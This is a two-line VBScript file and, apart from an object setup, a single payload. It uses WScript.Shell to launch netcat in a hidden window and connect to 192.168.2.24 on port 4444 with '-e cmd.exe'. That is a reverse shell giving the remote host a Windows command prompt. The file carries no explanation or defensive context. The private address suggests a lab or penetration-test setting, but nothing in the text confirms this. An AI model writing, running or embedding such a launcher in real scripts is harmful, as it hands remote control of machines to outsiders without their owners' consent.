Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c nc.exe -nv 192.168.2.24 4444 -e cmd.exe", 0, True
